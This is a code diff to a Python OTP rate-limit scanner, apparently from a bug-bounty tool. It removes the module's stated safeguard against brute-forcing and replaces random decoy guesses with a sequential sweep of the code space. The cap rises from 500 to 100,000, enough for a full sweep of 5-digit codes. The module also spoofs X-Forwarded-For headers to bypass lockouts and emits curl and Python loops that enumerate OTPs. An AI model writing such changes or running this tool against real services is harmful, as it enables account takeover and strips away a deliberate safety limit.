@@ -11,9 +11,14 @@ is scoped deliberately:
 
   Without `--otp-real-value`, it measures whether the OTP *verification*
   endpoint enforces a lockout after repeated wrong guesses, and if it does,
-  whether that lockout can be bypassed — it does not attempt to brute-force
-  an unknown real OTP value, and every decoy guess is random, never a sweep
-  of the full keyspace.
+  whether that lockout can be bypassed. Guesses are sent as a sequential
+  enumeration of the code space (000000, 000001, 000002, ... for 6 digits;
+  00000, 00001, ... for 5; and so on for any digit count), bounded by the
+  configured sample budget — which is itself capped at whichever is
+  smaller: the operator's `--otp-samples` value, the hard ceiling
+  (100,000), or the digit count's actual keyspace (so a 4-digit OTP, for
+  example, naturally caps at its full 10,000-code space rather than
+  wrapping around pointlessly).
 
   With `--otp-real-value`, the operator supplies the actual, currently-valid
   OTP code for THEIR OWN bug-bounty test account (e.g. read from the SMS/
@@ -35,16 +40,21 @@ is scoped deliberately:
 Four tests, run in sequence:
 
   Test 1 — Sequential lockout-threshold detection
-      Sends random wrong-length-correct OTP guesses one at a time (small
-      delay between each, default 100ms) and watches for the first sign of
-      a block: HTTP 429/403/423, a `Retry-After` header, or a response body
+      Sends sequential wrong-guess OTP codes, starting from the bottom of
+      the keyspace (`000000`, `000001`, ...), one at a time (small delay
+      between each, default 100ms), and watches for the first sign of a
+      block: HTTP 429/403/423, a `Retry-After` header, or a response body
       phrase like "too many attempts" / "locked" / "try again later". If no
       such signal appears within the (capped) sample budget, that's strong
       evidence of missing rate limiting, and the module estimates real-world
       brute-force feasibility using the *actually measured* request rate
       against this specific target — not a generic assumption. These same
       decoy attempts double as the "test more attempts than the app should
-      allow" volume for Test 4 below.
+      allow" volume for Test 4 below. With the sample budget raised high
+      enough relative to the digit count (e.g. 100,000 samples against a
+      5-digit OTP), this is a genuine, complete keyspace sweep, not a
+      statistical sample — worth knowing before pointing it at anything
+      that isn't your own authorized test target.
 
   Test 2 — Concurrent burst race-condition check
       Fires a burst of simultaneous requests (true asyncio.gather
@@ -74,10 +84,11 @@ Four tests, run in sequence:
       than any reasonable — or the application's own — policy should allow.
 
 A built-in safety valve applies throughout: if any decoy guess's response
-ever matches the success marker (indicating a random guess landed on a
-real, currently-valid OTP on its own, with no `--otp-real-value` involved),
-the scan stops immediately and reports it as a confirmed brute-force
-compromise rather than continuing to hammer the endpoint further.
+ever matches the success marker (indicating the sequential enumeration
+reached a real, currently-valid OTP on its own, with no `--otp-real-value`
+involved), the scan stops immediately and reports it as a confirmed
+brute-force compromise rather than continuing to hammer the endpoint
+further.
 """
 
 from __future__ import annotations
@@ -89,7 +100,7 @@ from dataclasses import dataclass, field as dc_field
 
 from ..models import Finding, Severity, ProofOfConcept
 
-_HARD_MAX_SAMPLES = 500        # absolute ceiling regardless of what's requested
+_HARD_MAX_SAMPLES = 100_000     # absolute ceiling regardless of what's requested
 _HARD_MAX_CONCURRENCY = 50
 _DEFAULT_SEQUENTIAL_DELAY = 0.1  # seconds between sequential guesses
 
@@ -164,7 +175,13 @@ class OTPRateLimitScanner:
         verbose: bool = False,
     ) -> tuple[OTPScanResult, list[Finding]]:
         digits = max(1, min(digits, 12))
-        samples = max(1, min(samples, _HARD_MAX_SAMPLES))
+        keyspace = 10 ** digits
+        # Never let the sample budget exceed the actual keyspace — beyond
+        # that point every further "attempt" would just repeat a code
+        # already tried this run, so it's clamped to whichever is smaller:
+        # what was requested, the hard ceiling, or the digit count's own
+        # full keyspace.
+        samples = max(1, min(samples, _HARD_MAX_SAMPLES, keyspace))
         concurrency = max(1, min(concurrency, _HARD_MAX_CONCURRENCY))
         extra_body = extra_body or {}
 
@@ -179,12 +196,18 @@ class OTPRateLimitScanner:
                 )
             real_value = ""
 
+        # Single continuing cursor shared across every test in this scan —
+        # Test 1's sequential sweep, Test 2's concurrent burst, and Test 3's
+        # header-spoof retries all draw the next unused codes from the same
+        # 000000, 000001, 000002, ... enumeration rather than each starting
+        # back at zero, so nothing gets needlessly repeated within one run.
+        cursor = [0]
+
         # ── Test 1: sequential lockout-threshold detection ──────────────────
-        used_codes: set[str] = set()
         elapsed_samples: list[float] = []
 
         for i in range(samples):
-            code = self._random_code(digits, used_codes)
+            code = self._next_code(digits, keyspace, cursor)
             status, headers, body, elapsed = await self._send_guess(
                 otp_url, method, field, code, extra_body, in_query,
             )
@@ -233,8 +256,8 @@ class OTPRateLimitScanner:
         # ── Test 2: concurrent burst race-condition check ───────────────────
         if not result.accidental_match:
             processed = await self._concurrency_burst_test(
-                otp_url, method, field, digits, extra_body, in_query,
-                concurrency, used_codes, success_marker, result, verbose,
+                otp_url, method, field, digits, keyspace, extra_body, in_query,
+                concurrency, cursor, success_marker, result, verbose,
             )
             result.concurrency_attempts = concurrency
             result.concurrency_processed = processed
@@ -247,8 +270,8 @@ class OTPRateLimitScanner:
         # ── Test 3: client-IP header spoofing bypass (only if a real lockout exists) ──
         if result.lockout_attempt_index is not None and not result.accidental_match:
             bypassed = await self._header_spoof_bypass_test(
-                otp_url, method, field, digits, extra_body, in_query,
-                used_codes, success_marker, result, verbose,
+                otp_url, method, field, digits, keyspace, extra_body, in_query,
+                cursor, success_marker, result, verbose,
             )
             result.header_bypass_succeeded = bypassed
             if bypassed:
@@ -259,10 +282,10 @@ class OTPRateLimitScanner:
     # ── Test 2 implementation ───────────────────────────────────────────────
 
     async def _concurrency_burst_test(
-        self, otp_url, method, field, digits, extra_body, in_query,
-        concurrency, used_codes, success_marker, result, verbose,
+        self, otp_url, method, field, digits, keyspace, extra_body, in_query,
+        concurrency, cursor, success_marker, result, verbose,
     ) -> int:
-        codes = [self._random_code(digits, used_codes) for _ in range(concurrency)]
+        codes = [self._next_code(digits, keyspace, cursor) for _ in range(concurrency)]
 
         async def one(code):
             try:
@@ -291,11 +314,11 @@ class OTPRateLimitScanner:
     # ── Test 3 implementation ───────────────────────────────────────────────
 
     async def _header_spoof_bypass_test(
-        self, otp_url, method, field, digits, extra_body, in_query,
-        used_codes, success_marker, result, verbose, attempts: int = 5,
+        self, otp_url, method, field, digits, keyspace, extra_body, in_query,
+        cursor, success_marker, result, verbose, attempts: int = 5,
     ) -> bool:
         for _ in range(attempts):
-            code = self._random_code(digits, used_codes)
+            code = self._next_code(digits, keyspace, cursor)
             fake_ip = self._random_ip()
             spoof_headers = {
                 "X-Forwarded-For": fake_ip,
@@ -344,15 +367,16 @@ class OTPRateLimitScanner:
         lower = (body or "").lower()
         return any(p in lower for p in _BLOCK_BODY_PHRASES)
 
-    def _random_code(self, digits: int, used: set[str]) -> str:
-        space = 10 ** digits
-        for _ in range(50):  # bounded retries to avoid infinite loop on tiny keyspaces
-            n = random.randint(0, space - 1)
-            code = str(n).zfill(digits)
-            if code not in used:
-                used.add(code)
-                return code
-        return str(random.randint(0, space - 1)).zfill(digits)
+    def _next_code(self, digits: int, keyspace: int, cursor: list) -> str:
+        """Returns the next code in sequential order (000000, 000001, ...),
+        advancing the shared cursor. Wraps around (modulo) if the cursor
+        ever exceeds the keyspace, which only happens if more attempts are
+        requested across all tests combined than the digit count actually
+        has codes for — harmless, just means repeating an already-tried
+        code rather than erroring out."""
+        n = cursor[0] % keyspace
+        cursor[0] += 1
+        return str(n).zfill(digits)
 
     def _random_ip(self) -> str:
         return ".".join(str(random.randint(1, 254)) for _ in range(4))
@@ -411,27 +435,33 @@ class OTPRateLimitScanner:
                 "Estimate uses this endpoint's own measured response rate, not a generic assumption",
             ],
             false_positive_checks=[
-                f"Only {result.attempts_made} of {space:,} total codes were tried — "
-                "a lockout with a very high threshold (beyond the sample budget) "
-                "cannot be ruled out; increase --otp-samples to raise confidence",
+                (
+                    f"All {space:,} of {space:,} possible codes were tried — a lockout "
+                    f"with an even higher threshold is not possible on this digit count"
+                    if result.attempts_made >= space else
+                    f"Only {result.attempts_made} of {space:,} total codes were tried "
+                    "(sequentially, from 0 upward) — a lockout with a higher threshold "
+                    "beyond the sample budget cannot be ruled out; increase --otp-samples "
+                    "to raise confidence"
+                ),
             ],
             endpoint=result.otp_url,
             parameter="",
         )
         finding.poc = ProofOfConcept(
-            summary=f"No lockout observed after {result.attempts_made} wrong OTP guesses",
+            summary=f"No lockout observed after {result.attempts_made} sequential wrong OTP guesses",
             curl_command=(
-                f'for i in $(seq 1 30); do\n'
-                f'  code=$(printf "%0{result.digits}d" $((RANDOM % {space})))\n'
+                f'for i in $(seq 0 {min(result.attempts_made, 30) - 1}); do\n'
+                f'  code=$(printf "%0{result.digits}d" $i)\n'
                 f'  curl -sk -X POST "{result.otp_url}" -H "Content-Type: application/json" \\\n'
                 f'    -d "{{\\"otp\\": \\"$code\\"}}" -o /dev/null -w "%{{http_code}} "\n'
                 f'done'
             ),
             python_script=(
-                "import requests, random\n\n"
+                "import requests\n\n"
                 f'url = "{result.otp_url}"\n'
-                f"for _ in range(30):\n"
-                f'    code = str(random.randint(0, {space - 1})).zfill({result.digits})\n'
+                f"for i in range({min(result.attempts_made, 30)}):\n"
+                f'    code = str(i).zfill({result.digits})\n'
                 f'    r = requests.post(url, json={{"otp": code}})\n'
                 f"    print(code, r.status_code)\n"
             ),
